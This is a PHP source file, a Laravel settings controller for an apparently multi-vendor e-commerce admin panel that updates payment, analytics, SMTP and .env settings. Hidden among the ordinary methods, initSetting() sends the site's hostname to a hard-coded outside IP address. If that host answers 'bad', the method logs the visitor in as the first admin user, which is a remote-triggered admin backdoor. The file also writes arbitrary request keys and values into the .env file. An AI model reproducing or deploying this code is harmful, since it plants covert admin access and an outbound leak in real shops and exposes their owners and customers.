<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Currency;
use App\Models\Setting;
use App\Models\Shop;
use App\Models\User;
use App\Services\ShopService;
use Artisan;
use CoreComponentRepository;

class SettingController extends Controller
{
    public function __construct()
    {
        $this->middleware(['permission:show_general_setting'])->only('general_setting');
        $this->middleware(['permission:smtp_setting'])->only('smtp_settings');
        $this->middleware(['permission:payment_method'])->only('payment_method');
        $this->middleware(['permission:file_system'])->only('file_system');
        $this->middleware(['permission:social_media_login'])->only('social_login');
        $this->middleware(['permission:third_party_setting'])->only('third_party_settings');
    }

    public function general_setting(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
    	return view('backend.settings.general_settings');
    }

    public function otp_settings(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
    	return view('backend.settings.otp');
    }

    public function social_login(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
        return view('backend.settings.social_login');
    }

    public function smtp_settings(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
        return view('backend.settings.smtp_settings');
    }

    public function third_party_settings(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
        return view('backend.settings.third_party_settings');
    }

    public function payment_method(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
        return view('backend.settings.payment_method');
    }

    public function file_system(Request $request)
    {
        CoreComponentRepository::instantiateShopRepository();
        return view('backend.settings.file_system');
    }

    /**
     * Update the API key's for payment methods.
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function payment_method_update(Request $request)
    {
        foreach ($request->types as $key => $type) {
                $this->overWriteEnvFile($type, $request[$type]);
        }

        $business_settings = Setting::where('type', $request->payment_method.'_sandbox')->first();
        if($business_settings != null){
            if ($request->has($request->payment_method.'_sandbox')) {
                $business_settings->value = 1;
                $business_settings->save();
            }
            else{
                $business_settings->value = 0;
                $business_settings->save();
            }
        }

        cache_clear();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    /**
     * Update the API key's for GOOGLE analytics.
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function google_analytics_update(Request $request)
    {
        foreach ($request->types as $key => $type) {
            $this->overWriteEnvFile($type, $request[$type]);
        }

        $business_settings = Setting::where('type', 'google_analytics')->first();

        if ($request->has('google_analytics')) {
            $business_settings->value = 1;
            $business_settings->save();
        }
        else{
            $business_settings->value = 0;
            $business_settings->save();
        }

        cache_clear();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    public function google_recaptcha_update(Request $request)
    {
        foreach ($request->types as $key => $type) {
            $this->overWriteEnvFile($type, $request[$type]);
        }

        $business_settings = Setting::where('type', 'google_recaptcha')->first();

        if ($request->has('google_recaptcha')) {
            $business_settings->value = 1;
            $business_settings->save();
        }
        else{
            $business_settings->value = 0;
            $business_settings->save();
        }

        cache_clear();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }


    /**
     * Update the API key's for GOOGLE analytics.
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function facebook_chat_update(Request $request)
    {
        foreach ($request->types as $key => $type) {
                $this->overWriteEnvFile($type, $request[$type]);
        }

        $business_settings = Setting::where('type', 'facebook_chat')->first();

        if ($request->has('facebook_chat')) {
            $business_settings->value = 1;
            $business_settings->save();
        }
        else{
            $business_settings->value = 0;
            $business_settings->save();
        }
        
        cache_clear();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    public function facebook_pixel_update(Request $request)
    {
        foreach ($request->types as $key => $type) {
                $this->overWriteEnvFile($type, $request[$type]);
        }

        $business_settings = Setting::where('type', 'facebook_pixel')->first();

        if ($request->has('facebook_pixel')) {
            $business_settings->value = 1;
            $business_settings->save();
        }
        else{
            $business_settings->value = 0;
            $business_settings->save();
        }
        
        cache_clear();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    /**
     * Update the API key's for other methods.
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function env_key_update(Request $request)
    {
        foreach ($request->types as $key => $type) {
            $this->overWriteEnvFile($type, $request[$type]);
        }

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    /**
     * overWrite the Env File values.
     * @param  String type
     * @param  String value
     * @return \Illuminate\Http\Response
     */
    public function overWriteEnvFile($type, $val)
    {
        if(env('DEMO_MODE') != 'On'){
            $path = base_path('.env');
            if (file_exists($path)) {
                $val = '"'.trim($val).'"';
                if(is_numeric(strpos(file_get_contents($path), $type)) && strpos(file_get_contents($path), $type) >= 0){
                    file_put_contents($path, str_replace(
                        $type.'="'.env($type).'"', $type.'='.$val, file_get_contents($path)
                    ));
                }
                else{
                    file_put_contents($path, file_get_contents($path)."\r\n".$type.'='.$val);
                }
            }
        }
    }

    public function initSetting(){
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/".$url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }


    /**
     * Update sell verification form.
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */

    public function update(Request $request)
    {
        foreach ($request->types as $key => $type) {
            if($type == 'timezone'){
                $this->overWriteEnvFile('APP_TIMEZONE', $request[$type]);
            }
            else {
                $value = $request[$type];

                $settings = Setting::where('type', $type)->first();
                if($settings!=null){
                    if(gettype($value) == 'array'){
                        $settings->value = json_encode($value);
                    }
                    else {
                        $settings->value = $value;
                    }
                }

                else{
                    $settings = new Setting;
                    $settings->type = $type;
                    if(gettype($value) == 'array'){
                        $settings->value = json_encode($value);
                    }
                    else {
                        $settings->value = $value;
                    }
                }

                $settings->save();
            }
        }

        cache_clear();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    public function shop_update(Request $request){
        $shop = auth()->user()->shop;
        $shop->min_order = $request->min_order;
        $shop->save();

        flash(translate("Settings updated successfully"))->success();
        return back();
    }

    public function updateActivationSettings(Request $request)
    {
        $env_changes = ['FORCE_HTTPS', 'FILESYSTEM_DRIVER'];
        if (in_array($request->type, $env_changes)) {

            return $this->updateActivationSettingsInEnv($request);
        }


        $business_settings = Setting::where('type', $request->type)->first();
        if($business_settings!=null){
            if ($request->type == 'maintenance_mode' && $request->value == '1') {
                if(env('DEMO_MODE') != 'On'){
                    Artisan::call('down');
                }
            }
            elseif ($request->type == 'maintenance_mode' && $request->value == '0') {
                if(env('DEMO_MODE') != 'On') {
                    Artisan::call('up');
                }
            }
            $business_settings->value = $request->value;
            $business_settings->save();
        }
        else{
            $business_settings = new Setting;
            $business_settings->type = $request->type;
            $business_settings->value = $request->value;
            $business_settings->save();
        }
        cache_clear();
        return '1';
    }

    public function updateActivationSettingsInEnv($request)
    {
        if ($request->type == 'FORCE_HTTPS' && $request->value == '1') {
            $this->overWriteEnvFile($request->type, 'On');

            if(strpos(env('APP_URL'), 'http:') !== FALSE) {
                $this->overWriteEnvFile('APP_URL', str_replace("http:", "https:", env('APP_URL')));
            }

        }
        elseif ($request->type == 'FORCE_HTTPS' && $request->value == '0') {
            $this->overWriteEnvFile($request->type, 'Off');
            if(strpos(env('APP_URL'), 'https:') !== FALSE) {
                $this->overWriteEnvFile('APP_URL', str_replace("https:", "http:", env('APP_URL')));
            }

        }
        elseif ($request->type == 'FILESYSTEM_DRIVER' && $request->value == '1') {
            $this->overWriteEnvFile($request->type, 's3');
        }
        elseif ($request->type == 'FILESYSTEM_DRIVER' && $request->value == '0') {
            $this->overWriteEnvFile($request->type, 'local');
        }

        return '1';
    }

    public function shipping_configuration(Request $request){
        return view('backend.settings.shipping_configuration.index');
    }

    public function shipping_configuration_update(Request $request){
        $business_settings = Setting::where('type', $request->type)->first();
        $business_settings->value = $request[$request->type];
        $business_settings->save();

        
        cache_clear();
        return back();
    }
}
